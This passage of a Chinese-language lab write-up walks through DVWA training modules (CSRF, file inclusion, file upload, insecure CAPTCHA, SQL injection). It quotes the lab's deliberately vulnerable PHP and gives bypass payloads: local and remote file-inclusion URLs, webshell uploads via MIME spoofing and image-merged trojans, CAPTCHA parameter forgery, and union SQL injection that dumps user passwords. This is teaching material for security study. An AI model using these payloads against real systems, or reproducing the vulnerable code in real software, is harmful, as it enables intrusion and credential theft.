&quot;&#39;;&quot;; $result = mysql_query( $insert ) or die( &#39;&lt;pre&gt;&#39; . mysql_error() . &#39;&lt;/pre&gt;&#39; ); // Feedback for the user echo &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;; } else { // Issue with passwords matching echo &quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;; } } else { // Didn&#39;t come from a trusted source echo &quot;&lt;pre&gt;That request didn&#39;t look correct.&lt;/pre&gt;&quot;; } mysql_close(); } ?&gt; </code></pre><p>可以看到这里在获取$pass_new和$pass_conf这两个变量之前，先利用一个if语句来判断“$_SERVER[‘HTTP_REFERER’]”的值是否是127.0.0.1。这是一种基本的防御CSRF攻击的方法：验证HTTP Referer字段。我们可以再次使用之前的方法来实施CSRF攻击，可以发现已经不起作用了。下面就来解释一下这种防御方法的原理。</p><p>根据HTTP协议，在HTTP头中有一个字段叫Referer，它记录了该HTTP请求的来源地址。比如下面这个利用Burpsuite拦截到的数据包，数据要提交到的页面是upfile_Other.asp，而我们是通过Referer字段后的<a href="http://192168.80.131/upload_Other.asp这个页面发起的请求。" target="_blank" rel="external">http://192168.80.131/upload_Other.asp这个页面发起的请求。</a></p><blockquote><p>根据Referer验证请求来源，绕过思路：在HTTP请求头声明Referer。<br><img src="http://oy0tigw51.bkt.clouddn.com/201710240213_708.png" alt=""></p></blockquote><p>High：</p><pre><code>&lt;?php if( isset( $_GET[ &#39;Change&#39; ] ) ) { // Check Anti-CSRF token checkToken( $_REQUEST[ &#39;user_token&#39; ], $_SESSION[ &#39;session_token&#39; ], &#39;index.php&#39; ); // Get input $pass_new  = $_GET[ &#39;password_new&#39; ]; $pass_conf = $_GET[ &#39;password_conf&#39; ]; // Do the passwords match? if( $pass_new == $pass_conf ) { // They do! $pass_new = mysql_real_escape_string( $pass_new ); $pass_new = md5( $pass_new ); // Update the database $insert = &quot;UPDATE `users` SET password = &#39;$pass_new&#39; WHERE user = &#39;&quot; . dvwaCurrentUser() . &quot;&#39;;&quot;; $result = mysql_query( $insert ) or die( &#39;&lt;pre&gt;&#39; . mysql_error() . &#39;&lt;/pre&gt;&#39; ); // Feedback for the user echo &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;; } else { // Issue with passwords matching echo &quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;; } mysql_close(); } // Generate Anti-CSRF token generateSessionToken(); ?&gt;</code></pre><p>High级别的代码加入了Anti-CSRF token机制，用户每次访问改密页面时，服务器会返回一个随机的token，向服务器发起请求时，需要提交token参数，而服务器在收到请求时，会优先检查token，只有token正确，才会处理客户端的请求。</p><p>这里需要管理员首先输入当前密码，然后才能重新设置密码。这就是目前非常有效的一种防御CSRF攻击的方法：二次确认。<br>不会</p><p>impossible：</p><p>Impossible级别的代码利用PDO技术防御SQL注入，至于防护CSRF，则要求用户输入原始密码（简单粗暴），攻击者在不知道原始密码的情况下，无论如何都无法进行CSRF攻击。</p><hr><h3 id="五：文件包含漏洞"><a href="#五：文件包含漏洞" class="headerlink" title="五：文件包含漏洞"></a>五：文件包含漏洞</h3><p>文件包含（漏洞），是指当服务器开启allow_url_include选项时，就可以通过php的某些特性函数（include()，require()和include_once()，require_once()）利用url去动态包含文件，此时如果没有对文件来源进行严格审查，就会导致任意文件读取或者任意命令执行。文件包含漏洞分为本地文件包含漏洞与远程文件包含漏洞，远程文件包含漏洞是因为开启了php配置中的allow_url_fopen选项（选项开启之后，服务器允许包含一个远程的文件）。<br>如果允许客户端用户输入控制动态包含在服务器端的文件，会导致恶意代码的执行及敏感信息泄露，主要包括本地文件包含和远程文件包含两种形式。<br>常见包含函数有：include()、require()<br>区别：</p><pre><code>include是当代码执行到它的时候才加载文件,发生错误的时候只是给一个警告,然后继续往下执行require是只要程序一执行就会立即调用文件,发生错误的时候会输出错误信息,并且终止脚本的运行</code></pre><p>require一般是用于文件头包含类文件、数据库等等文件,include一般是用于包含html模版文件<br>include_once()、require_once()与(include\require)的功能相同,只是区别于当重复调用的时候，它只会调用一次。</p><p>low：</p><pre><code>&lt;?php// The page we wish to display$file = $_GET[ &#39;page&#39; ];?&gt; </code></pre><p>URL可发现，注入点在page，low等级直接注入<br><a href="http://192.168.67.22/dvwa/vulnerabilities/fi/?page=/etc/profile" target="_blank" rel="external">http://192.168.67.22/dvwa/vulnerabilities/fi/?page=/etc/profile</a><br>报错，显示没有这个文件，说明不是服务器系统不是Linux，但同时暴露了服务器文件的绝对路径<br><img src="http://oy0tigw51.bkt.clouddn.com/201710241240_986.png" alt=""><br>payload：<br><a href="http://localhost:9096/DVWA-1.9/vulnerabilities/fi/?page=D:\phpStudy\WWW\DVWA-1.9\php.ini" target="_blank" rel="external">http://localhost:9096/DVWA-1.9/vulnerabilities/fi/?page=D:\phpStudy\WWW\DVWA-1.9\php.ini</a><br>成功进入服务器的php.ini文件<br><img src="http://oy0tigw51.bkt.clouddn.com/201710241247_240.png" alt=""></p><p>构造url（相对路径）</p><pre><code>http://localhost:9096/DVWA-1.9/vulnerabilities/fi/?page=..\..\..\..\..\..\..\..\..\phpStudy\WWW\DVWA-1.9\php.ini</code></pre><p>2.远程文件包含</p><p>当服务器的php配置中，选项allow_url_fopen与allow_url_include为开启状态时，服务器会允许包含远程服务器上的文件，如果对文件来源没有检查的话，就容易导致任意远程代码执行。</p><p>在远程服务器192.168.5.12上传一个phpinfo.txt文件.<br>构造url</p><pre><code>http://localhost:9096/DVWA-1.9/vulnerabilities/fi/?page=http://192.168.5.12/phpinfo.txt</code></pre><p>Medium:</p><p>&lt;php</p><p>//Thepagewewishtodisplay<br>$file=$_GET[‘page’];</p><p>//Inputvalidation<br>$file=str_replace(array(“<a href="http://&quot;,&quot;https://&quot;),&quot;&quot;,$file" target="_blank" rel="external">http://&quot;,&quot;https://&quot;),&quot;&quot;,$file</a>);<br>$file=str_replace(array(“../“,”..\””),””,$file);</p><p>&gt;</p><p>Medium级别的代码增加了str_replace函数，对page参数进行了一定的处理，将”http:// ”、”<a href="https://”、" target="_blank" rel="external">https://”、</a> ” ../”、”..\”替换为空字符。</p><p>使用str_replace函数是极其不安全的，因为可以使用双写绕过替换规则。<br>同时，因为替换的只是“../”、“..\”，所以对采用绝对路径的方式包含文件是不会受到任何限制的。</p><p>paylaod:<br><a href="http://localhost:9096/DVWA-1.9/vulnerabilities/fi/?page=D:\phpStudy\WWW\DVWA-1.9\php.ini" target="_blank" rel="external">http://localhost:9096/DVWA-1.9/vulnerabilities/fi/?page=D:\phpStudy\WWW\DVWA-1.9\php.ini</a></p><p>远程文件包含:<br><a href="http://localhost:9096/DVWA-1.9/vulnerabilities/fi/?page=htthttp://p://192.168.5.12/phpinfo.txt" target="_blank" rel="external">http://localhost:9096/DVWA-1.9/vulnerabilities/fi/?page=htthttp://p://192.168.5.12/phpinfo.txt</a></p><p>High:</p><pre><code>&lt;php//Thepagewewishtodisplay$file=$_GET[&#39;page&#39;];//Inputvalidationif(!fnmatch(&quot;file*&quot;,$file)&amp;&amp;$file!=&quot;include.php&quot;){   //Thisisn&#39;tthepagewewant!echo&quot;ERROR:Filenotfound!&quot;;exit;}&gt;</code></pre><p>High级别的代码使用了fnmatch函数检查page参数，要求page参数的开头必须是file，服务器才会去包含相应的文件。</p><p>思路：利用file协议绕过防护策略。<br>payload：<br><a href="http://localhost:9096/DVWA-1.9/vulnerabilities/fi/?page=file:///D:\phpStudy\WWW\DVWA-1.9\php.ini" target="_blank" rel="external">http://localhost:9096/DVWA-1.9/vulnerabilities/fi/?page=file:///D:\phpStudy\WWW\DVWA-1.9\php.ini</a><br><img src="http://oy0tigw51.bkt.clouddn.com/201710241306_740.png" alt=""><br>至于执行任意命令，需要配合文件上传漏洞利用。首先需要上传一个内容为php的文件，然后再利用file协议去包含上传文件（需要知道上传文件的绝对路径），从而实现任意命令执行。</p><p>Impossible：</p><pre><code>&lt;php//Thepagewewishtodisplay$file=$_GET[&#39;page&#39;];//Onlyallowinclude.phporfile{1..3}.phpif($file!=&quot;include.php&quot;&amp;&amp;$file!=&quot;file1.php&quot;&amp;&amp;$file!=&quot;file2.php&quot;&amp;&amp;$file!=&quot;file3.php&quot;){//Thisisn&#39;tthepagewewant!echo&quot;ERROR:Filenotfound!&quot;;exit;}&gt;</code></pre><p>Impossible级别的代码使用了白名单机制进行防护，白名单算是目前最有效的防过滤手段。</p><p>柠檬师傅的总结：<br><a href="http://www.cnblogs.com/iamstudy/articles/include_file.html" target="_blank" rel="external">文件包含漏洞小结</a></p><h3 id="五：File-Upload"><a href="#五：File-Upload" class="headerlink" title="五：File Upload"></a>五：File Upload</h3><p>文件上传漏洞，通常是由于对上传文件的类型、内容没有进行严格的过滤、检查，使得攻击者可以通过上传木马获取服务器的webshell权限，因此文件上传漏洞带来的危害常常是毁灭性的，Apache、Tomcat、Nginx等都曝出过文件上传漏洞。<br><img src="http://oy0tigw51.bkt.clouddn.com/201710241313_324.png" alt=""></p><p>Low：</p><pre><code>&lt;?php if( isset( $_POST[ &#39;Upload&#39; ] ) ) { // Where are we going to be writing to? $target_path  = DVWA_WEB_PAGE_TO_ROOT . &quot;hackable/uploads/&quot;; $target_path .= basename( $_FILES[ &#39;uploaded&#39; ][ &#39;name&#39; ] ); // Can we move the file to the upload folder? if( !move_uploaded_file( $_FILES[ &#39;uploaded&#39; ][ &#39;tmp_name&#39; ], $target_path ) ) { // No echo &#39;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#39;; } else { // Yes! echo &quot;&lt;pre&gt;{$target_path} succesfully uploaded!&lt;/pre&gt;&quot;; } } ?&gt; </code></pre><p><img src="http://oy0tigw51.bkt.clouddn.com/201710241319_392.png" alt=""><br>连接菜刀getshell~<br><img src="http://oy0tigw51.bkt.clouddn.com/201710241336_64.png" alt=""><br>Medium：</p><p>&lt;?php </p><pre><code>if( isset( $_POST[ &#39;Upload&#39; ] ) ) { // Where are we going to be writing to? $target_path  = DVWA_WEB_PAGE_TO_ROOT . &quot;hackable/uploads/&quot;; $target_path .= basename( $_FILES[ &#39;uploaded&#39; ][ &#39;name&#39; ] ); // File information $uploaded_name = $_FILES[ &#39;uploaded&#39; ][ &#39;name&#39; ]; $uploaded_type = $_FILES[ &#39;uploaded&#39; ][ &#39;type&#39; ]; $uploaded_size = $_FILES[ &#39;uploaded&#39; ][ &#39;size&#39; ]; // Is it an image? if( ( $uploaded_type == &quot;image/jpeg&quot; || $uploaded_type == &quot;image/png&quot; ) &amp;&amp; ( $uploaded_size &lt; 100000 ) ) { // Can we move the file to the upload folder? if( !move_uploaded_file( $_FILES[ &#39;uploaded&#39; ][ &#39;tmp_name&#39; ], $target_path ) ) { // No echo &#39;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#39;; } else { // Yes! echo &quot;&lt;pre&gt;{$target_path} succesfully uploaded!&lt;/pre&gt;&quot;; } } else { // Invalid file echo &#39;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;&#39;; } } ?&gt;</code></pre><p>查看源码，可发现代码限制了MIME类型和文件大小<br>if( ( $uploaded_type == “image/jpeg” || $uploaded_type == “image/png” ) &amp;&amp; ( $uploaded_size &lt; 100000 ) )<br>绕过思路，改一下MIME类型即可。<br><img src="http://oy0tigw51.bkt.clouddn.com/201710241343_499.png" alt=""><br>上传cmd.jpg文件，抓包。<br><img src="http://oy0tigw51.bkt.clouddn.com/201710241344_12.png" alt=""><br>尝试修改filename为hack.php。<br><img src="http://oy0tigw51.bkt.clouddn.com/201710241345_547.png" alt=""><br>上菜刀得到shell~</p><p>截断绕过规则</p><p>在php版本小于5.3.4的服务器中，当Magic_quote_gpc选项为off时，可以在文件名中使用%00截断，所以可以把上传文件命名为hack.php%00.png。</p><p>可以看到，包中的文件类型为image/png，可以通过文件类型检查。</p><p>High：</p><pre><code>    &lt;?php     if( isset( $_POST[ &#39;Upload&#39; ] ) ) {     // Where are we going to be writing to?     $target_path  = DVWA_WEB_PAGE_TO_ROOT . &quot;hackable/uploads/&quot;;     $target_path .= basename( $_FILES[ &#39;uploaded&#39; ][ &#39;name&#39; ] );     // File information     $uploaded_name = $_FILES[ &#39;uploaded&#39; ][ &#39;name&#39; ];     $uploaded_ext  = substr( $uploaded_name, strrpos( $uploaded_name, &#39;.&#39; ) + 1);     $uploaded_size = $_FILES[ &#39;uploaded&#39; ][ &#39;size&#39; ];     $uploaded_tmp  = $_FILES[ &#39;uploaded&#39; ][ &#39;tmp_name&#39; ];     // Is it an image?     if( ( strtolower( $uploaded_ext ) == &quot;jpg&quot; || strtolower( $uploaded_ext ) == &quot;jpeg&quot; || strtolower( $uploaded_ext ) == &quot;png&quot; ) &amp;&amp;     ( $uploaded_size &lt; 100000 ) &amp;&amp;     getimagesize( $uploaded_tmp ) ) {     // Can we move the file to the upload folder?     if( !move_uploaded_file( $uploaded_tmp, $target_path ) ) {     // No     echo &#39;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#39;;     }     else {     // Yes!     echo &quot;&lt;pre&gt;{$target_path} succesfully uploaded!&lt;/pre&gt;&quot;;     }     }     else {     // Invalid file     echo &#39;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;&#39;;     }     }     ?&gt;</code></pre><p>可发现代码限制了后缀名，文件大小和用getimagesize检查文件头并判断文件大小</p><pre><code>&gt; // Is it an image? &gt; if( ( strtolower( $uploaded_ext ) == &quot;jpg&quot; || strtolower( $uploaded_ext ) == &quot;jpeg&quot; || strtolower( $uploaded_ext ) == &quot;png&quot; ) &amp;&amp; ( $uploaded_size &lt; 100000 ) &amp;&amp; getimagesize( $uploaded_tmp ) )</code></pre><p>strrpos(string,find,start)</p><p>函数返回字符串find在另一字符串string中最后一次出现的位置，如果没有找到字符串则返回false，可选参数start规定在何处开始搜索。</p><p>getimagesize(string filename)</p><p>函数会通过读取文件头，返回图片的长、宽等信息，如果没有相关的图片文件头，函数会报错。</p><p>可以看到，High级别的代码读取文件名中最后一个”.”后的字符串，期望通过文件名来限制文件类型，因此要求上传文件名形式必须是”<em>.jpg”、”</em>.jpeg” 、”*.png”之一。同时，getimagesize函数更是限制了上传文件的文件头必须为图像类型。</p><p>绕过思路：shell的后缀名改为jpg/jpeg/png，文件头插入jpg/png/gif的头部信息绕过getimagesize，<br>首先利用copy将一句话木马文件cmd.php与图片文件1.jpg合并Piccmd.jpg<br><img src="http://oy0tigw51.bkt.clouddn.com/201710241425_841.png" alt=""></p><p>上菜刀得到shell</p><p>Impossible：</p><pre><code>&lt;?php if( isset( $_POST[ &#39;Upload&#39; ] ) ) { // Check Anti-CSRF token checkToken( $_REQUEST[ &#39;user_token&#39; ], $_SESSION[ &#39;session_token&#39; ], &#39;index.php&#39; ); // File information $uploaded_name = $_FILES[ &#39;uploaded&#39; ][ &#39;name&#39; ]; $uploaded_ext  = substr( $uploaded_name, strrpos( $uploaded_name, &#39;.&#39; ) + 1); $uploaded_size = $_FILES[ &#39;uploaded&#39; ][ &#39;size&#39; ]; $uploaded_type = $_FILES[ &#39;uploaded&#39; ][ &#39;type&#39; ]; $uploaded_tmp  = $_FILES[ &#39;uploaded&#39; ][ &#39;tmp_name&#39; ]; // Where are we going to be writing to? $target_path   = DVWA_WEB_PAGE_TO_ROOT . &#39;hackable/uploads/&#39;; //$target_file   = basename( $uploaded_name, &#39;.&#39; . $uploaded_ext ) . &#39;-&#39;; $target_file   =  md5( uniqid() . $uploaded_name ) . &#39;.&#39; . $uploaded_ext; $temp_file = ( ( ini_get( &#39;upload_tmp_dir&#39; ) == &#39;&#39; ) ? ( sys_get_temp_dir() ) : ( ini_get( &#39;upload_tmp_dir&#39; ) ) ); $temp_file.= DIRECTORY_SEPARATOR . md5( uniqid() . $uploaded_name ) . &#39;.&#39; . $uploaded_ext; // Is it an image? if( ( strtolower( $uploaded_ext ) == &#39;jpg&#39; || strtolower( $uploaded_ext ) == &#39;jpeg&#39; || strtolower( $uploaded_ext ) == &#39;png&#39; ) &amp;&amp; ( $uploaded_size &lt; 100000 ) &amp;&amp; ( $uploaded_type == &#39;image/jpeg&#39; || $uploaded_type == &#39;image/png&#39; ) &amp;&amp; getimagesize( $uploaded_tmp ) ) { // Strip any metadata, by re-encoding image (Note, using php-Imagick is recommended over php-GD) if( $uploaded_type == &#39;image/jpeg&#39; ) { $img = imagecreatefromjpeg( $uploaded_tmp ); imagejpeg( $img, $temp_file, 100); } else { $img = imagecreatefrompng( $uploaded_tmp ); imagepng( $img, $temp_file, 9); } imagedestroy( $img ); // Can we move the file to the web root from the temp folder? if( rename( $temp_file, ( getcwd() . DIRECTORY_SEPARATOR . $target_path . $target_file ) ) ) { // Yes! echo &quot;&lt;pre&gt;&lt;a href=&#39;${target_path}${target_file}&#39;&gt;${target_file}&lt;/a&gt; succesfully uploaded!&lt;/pre&gt;&quot;; } else { // No echo &#39;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#39;; } // Delete any temp files if( file_exists( $temp_file ) ) unlink( $temp_file ); } else { // Invalid file echo &#39;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;&#39;; } } // Generate Anti-CSRF token generateSessionToken(); ?&gt;</code></pre><p>该级别的代码对上传文件进行了重命名（为md5值，导致%00截断无法绕过过滤规则），加入Anti-CSRF token防护CSRF攻击，同时对文件的内容作了严格的检查，导致攻击者无法上传含有恶意脚本的文件。</p><h3 id="七：Insecure-CAPTCHA"><a href="#七：Insecure-CAPTCHA" class="headerlink" title="七：Insecure CAPTCHA"></a>七：Insecure CAPTCHA</h3><p>reCAPTCHA验证流程</p><p>这一模块的验证码使用的是Google提供reCAPTCHA服务，下图是验证的具体流程。<br><img src="http://oy0tigw51.bkt.clouddn.com/201710241444_780.jpg" alt=""></p><p>服务器通过调用recaptcha_check_answer函数检查用户输入的正确性。</p><p>recaptcha_check_answer($privkey,$remoteip, $challenge,$response)</p><p>low：</p><pre><code>&lt;?php if( isset( $_POST[ &#39;Change&#39; ] ) &amp;&amp; ( $_POST[ &#39;step&#39; ] == &#39;1&#39; ) ) { // Hide the CAPTCHA form $hide_form = true; // Get input $pass_new  = $_POST[ &#39;password_new&#39; ]; $pass_conf = $_POST[ &#39;password_conf&#39; ]; // Check CAPTCHA from 3rd party $resp = recaptcha_check_answer( $_DVWA[ &#39;recaptcha_private_key&#39; ], $_SERVER[ &#39;REMOTE_ADDR&#39; ], $_POST[ &#39;recaptcha_challenge_field&#39; ], $_POST[ &#39;recaptcha_response_field&#39; ] ); // Did the CAPTCHA fail? if( !$resp-&gt;is_valid ) { // What happens when the CAPTCHA was entered incorrectly $html .= &quot;&lt;pre&gt;&lt;br /&gt;The CAPTCHA was incorrect. Please try again.&lt;/pre&gt;&quot;; $hide_form = false; return; } else { // CAPTCHA was correct. Do both new passwords match? if( $pass_new == $pass_conf ) { // Show next stage for the user echo &quot; &lt;pre&gt;&lt;br /&gt;You passed the CAPTCHA! Click the button to confirm your changes.&lt;br /&gt;&lt;/pre&gt; &lt;form action=\&quot;#\&quot; method=\&quot;POST\&quot;&gt; &lt;input type=\&quot;hidden\&quot; name=\&quot;step\&quot; value=\&quot;2\&quot; /&gt; &lt;input type=\&quot;hidden\&quot; name=\&quot;password_new\&quot; value=\&quot;{$pass_new}\&quot; /&gt; &lt;input type=\&quot;hidden\&quot; name=\&quot;password_conf\&quot; value=\&quot;{$pass_conf}\&quot; /&gt; &lt;input type=\&quot;submit\&quot; name=\&quot;Change\&quot; value=\&quot;Change\&quot; /&gt; &lt;/form&gt;&quot;; } else { // Both new passwords do not match. $html .= &quot;&lt;pre&gt;Both passwords must match.&lt;/pre&gt;&quot;; $hide_form = false; } } } if( isset( $_POST[ &#39;Change&#39; ] ) &amp;&amp; ( $_POST[ &#39;step&#39; ] == &#39;2&#39; ) ) { // Hide the CAPTCHA form $hide_form = true; // Get input $pass_new  = $_POST[ &#39;password_new&#39; ]; $pass_conf = $_POST[ &#39;password_conf&#39; ]; // Check to see if both password match if( $pass_new == $pass_conf ) { // They do! $pass_new = mysql_real_escape_string( $pass_new ); $pass_new = md5( $pass_new ); // Update database $insert = &quot;UPDATE `users` SET password = &#39;$pass_new&#39; WHERE user = &#39;&quot; . dvwaCurrentUser() . &quot;&#39;;&quot;; $result = mysql_query( $insert ) or die( &#39;&lt;pre&gt;&#39; . mysql_error() . &#39;&lt;/pre&gt;&#39; ); // Feedback for the end user echo &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;; } else { // Issue with the passwords matching echo &quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;; $hide_form = false; } mysql_close(); } ?&gt;</code></pre><p>通过构造参数绕过验证过程的第一步<br>首先输入密码，点击Change按钮，抓包，更改step参数=2绕过验证码</p><p>Medium：</p><pre><code>&lt;?php if( isset( $_POST[ &#39;Change&#39; ] ) &amp;&amp; ( $_POST[ &#39;step&#39; ] == &#39;1&#39; ) ) { // Hide the CAPTCHA form $hide_form = true; // Get input $pass_new  = $_POST[ &#39;password_new&#39; ]; $pass_conf = $_POST[ &#39;password_conf&#39; ]; // Check CAPTCHA from 3rd party $resp = recaptcha_check_answer( $_DVWA[ &#39;recaptcha_private_key&#39; ], $_SERVER[ &#39;REMOTE_ADDR&#39; ], $_POST[ &#39;recaptcha_challenge_field&#39; ], $_POST[ &#39;recaptcha_response_field&#39; ] ); // Did the CAPTCHA fail? if( !$resp-&gt;is_valid ) { // What happens when the CAPTCHA was entered incorrectly $html .= &quot;&lt;pre&gt;&lt;br /&gt;The CAPTCHA was incorrect. Please try again.&lt;/pre&gt;&quot;; $hide_form = false; return; } else { // CAPTCHA was correct. Do both new passwords match? if( $pass_new == $pass_conf ) { // Show next stage for the user echo &quot; &lt;pre&gt;&lt;br /&gt;You passed the CAPTCHA! Click the button to confirm your changes.&lt;br /&gt;&lt;/pre&gt; &lt;form action=\&quot;#\&quot; method=\&quot;POST\&quot;&gt; &lt;input type=\&quot;hidden\&quot; name=\&quot;step\&quot; value=\&quot;2\&quot; /&gt; &lt;input type=\&quot;hidden\&quot; name=\&quot;password_new\&quot; value=\&quot;{$pass_new}\&quot; /&gt; &lt;input type=\&quot;hidden\&quot; name=\&quot;password_conf\&quot; value=\&quot;{$pass_conf}\&quot; /&gt; &lt;input type=\&quot;hidden\&quot; name=\&quot;passed_captcha\&quot; value=\&quot;true\&quot; /&gt; &lt;input type=\&quot;submit\&quot; name=\&quot;Change\&quot; value=\&quot;Change\&quot; /&gt; &lt;/form&gt;&quot;; } else { // Both new passwords do not match. $html .= &quot;&lt;pre&gt;Both passwords must match.&lt;/pre&gt;&quot;; $hide_form = false; } } } if( isset( $_POST[ &#39;Change&#39; ] ) &amp;&amp; ( $_POST[ &#39;step&#39; ] == &#39;2&#39; ) ) { // Hide the CAPTCHA form $hide_form = true; // Get input $pass_new  = $_POST[ &#39;password_new&#39; ]; $pass_conf = $_POST[ &#39;password_conf&#39; ]; // Check to see if they did stage 1 if( !$_POST[ &#39;passed_captcha&#39; ] ) { $html .= &quot;&lt;pre&gt;&lt;br /&gt;You have not passed the CAPTCHA.&lt;/pre&gt;&quot;; $hide_form = false; return; } // Check to see if both password match if( $pass_new == $pass_conf ) { // They do! $pass_new = mysql_real_escape_string( $pass_new ); $pass_new = md5( $pass_new ); // Update database $insert = &quot;UPDATE `users` SET password = &#39;$pass_new&#39; WHERE user = &#39;&quot; . dvwaCurrentUser() . &quot;&#39;;&quot;; $result = mysql_query( $insert ) or die( &#39;&lt;pre&gt;&#39; . mysql_error() . &#39;&lt;/pre&gt;&#39; ); // Feedback for the end user echo &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;; } else { // Issue with the passwords matching echo &quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;; $hide_form = false; } mysql_close(); } ?&gt;</code></pre><p>Medium级别的代码在第二步验证时，参加了对参数passed_captcha的检查，如果参数值为true，则认为用户已经通过了验证码检查，然而用户依然可以通过伪造参数绕过验证，本质上来说，这与Low级别的验证没有任何区别。<br>可以通过抓包，更改step参数，增加passed_captcha参数，绕过验证码<br>&amp;passed_captcha=true</p><p>High：</p><pre><code>&lt;?php if( isset( $_POST[ &#39;Change&#39; ] ) ) { // Hide the CAPTCHA form $hide_form = true; // Get input $pass_new  = $_POST[ &#39;password_new&#39; ]; $pass_conf = $_POST[ &#39;password_conf&#39; ]; // Check CAPTCHA from 3rd party $resp = recaptcha_check_answer( $_DVWA[ &#39;recaptcha_private_key&#39; ], $_SERVER[ &#39;REMOTE_ADDR&#39; ], $_POST[ &#39;recaptcha_challenge_field&#39; ], $_POST[ &#39;recaptcha_response_field&#39; ] ); // Did the CAPTCHA fail? if( !$resp-&gt;is_valid &amp;&amp; ( $_POST[ &#39;recaptcha_response_field&#39; ] != &#39;hidd3n_valu3&#39; || $_SERVER[ &#39;HTTP_USER_AGENT&#39; ] != &#39;reCAPTCHA&#39; ) ) { // What happens when the CAPTCHA was entered incorrectly $html .= &quot;&lt;pre&gt;&lt;br /&gt;The CAPTCHA was incorrect. Please try again.&lt;/pre&gt;&quot;; $hide_form = false; return; } else { // CAPTCHA was correct. Do both new passwords match? if( $pass_new == $pass_conf ) { $pass_new = mysql_real_escape_string( $pass_new ); $pass_new = md5( $pass_new ); // Update database $insert = &quot;UPDATE `users` SET password = &#39;$pass_new&#39; WHERE user = &#39;&quot; . dvwaCurrentUser() . &quot;&#39; LIMIT 1;&quot;; $result = mysql_query( $insert ) or die( &#39;&lt;pre&gt;&#39; . mysql_error() . &#39;&lt;/pre&gt;&#39; ); // Feedback for user echo &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;; } else { // Ops. Password mismatch $html .= &quot;&lt;pre&gt;Both passwords must match.&lt;/pre&gt;&quot;; $hide_form = false; } } mysql_close(); } // Generate Anti-CSRF token generateSessionToken(); ?&gt;</code></pre><p>可以看到，服务器的验证逻辑是当$resp（这里是指谷歌返回的验证结果）是false，并且参数recaptcha_response_field不等于hidd3n_valu3（或者http包头的User-Agent参数不等于reCAPTCHA）时，就认为验证码输入错误，反之则认为已经通过了验证码的检查。<br>更改参数recaptcha_response_field以及http包头的User-Agent：等于reCAPTCHA</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201710241515_889.png" alt=""></p><p>impossible：<br>该级别代码未发现漏洞</p><h3 id="八：SQL-Injection（SQL注入）"><a href="#八：SQL-Injection（SQL注入）" class="headerlink" title="八：SQL Injection（SQL注入）"></a>八：SQL Injection（SQL注入）</h3><p>通过把SQL命令插入到Web表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。具体来说，它是利用现有应用程序，将（恶意）的SQL命令注入到后台数据库引擎执行的能力，它可以通过在Web表单中输入（恶意）SQL语句得到一个存在安全漏洞的网站上的数据库，而不是按照设计者意图去执行SQL语句。</p><p>手工注入（非盲注）的步骤。</p><pre><code>1.判断是否存在注入，注入是字符型还是数字型2.猜解SQL查询语句中的字段数3.确定显示的字段顺序4.获取当前数据库5.获取数据库中的表6.获取表中的字段名7.下载数据</code></pre><p>Low：</p><pre><code>&lt;?php if( isset( $_REQUEST[ &#39;Submit&#39; ] ) ) { // Get input $id = $_REQUEST[ &#39;id&#39; ]; // Check database $query  = &quot;SELECT first_name, last_name FROM users WHERE user_id = &#39;$id&#39;;&quot;; $result = mysql_query( $query ) or die( &#39;&lt;pre&gt;&#39; . mysql_error() . &#39;&lt;/pre&gt;&#39; ); // Get results $num = mysql_numrows( $result ); $i   = 0; while( $i &lt; $num ) { // Get values $first = mysql_result( $result, $i, &quot;first_name&quot; ); $last  = mysql_result( $result, $i, &quot;last_name&quot; ); // Feedback for end user echo &quot;&lt;pre&gt;ID: {$id}&lt;br /&gt;First name: {$first}&lt;br /&gt;Surname: {$last}&lt;/pre&gt;&quot;; // Increase loop count $i++; } mysql_close(); } ?&gt;</code></pre><p>1.<img src="http://oy0tigw51.bkt.clouddn.com/201710241530_443.png" alt=""></p><p><img src="http://oy0tigw51.bkt.clouddn.com/201710241533_295.png" alt=""><br>2.猜解SQL查询语句中的字段数<br>union select 1,2,3<br>3.确定显示的字段顺序<br>1′ union select 1,2 #<br>4.获取当前数据库</p><p>输入1′ union select 1,database() #，<br>5.获取数据库中的表</p><p>输入1′ union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #，<br>6.获取表中的字段名</p><p>输入1′ union select 1,group_concat(column_name) from information_schema.columns where table_name=’users’ #<br>7.下载数据</p><p>输入1′ or 1=1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users #<br>的数据<br><img src="http://oy0tigw51.bkt.clouddn.com/201710241607_214.png" alt=""></p><p>得到了users表中所有用户的user_id,first_name,last_name,password的数据。</p><h5 id="Medium："><a href="#Medium：" class="headerlink" title="Medium："></a>Medium：</h5><p>&lt;?php </p><p>if( isset( $_POST[ ‘Submit’ ] ) ) {<br>    // Get input<br>    $id = $_POST[ ‘id’ ];<br>    $id = mysql_real_escape_string( $id ); </p><pre><code>// Check database $query  = &quot;SELECT first_name, last_name FROM users WHERE user_id = $id;&quot;; $result = mysql_query( $query ) or die( &#39;&lt;pre&gt;&#39; . mysql_error() . &#39;&lt;/pre&gt;&#39; ); // Get results $num = mysql_numrows( $result ); $i   = 0; while( $i &lt; $num ) {     // Display values     $first = mysql_result( $result, $i, &quot;first_name&quot; );     $last  = mysql_result( $result, $i, &quot;last_name&quot; );     // Feedback for end user     echo &quot;&lt;pre&gt;ID: {$id}&lt;br /&gt;First name: {$first}&lt;br /&gt;Surname: {$last}&lt;/pre&gt;&quot;;     // Increase loop count     $i++; } //mysql_close(); </code></pre><p>} 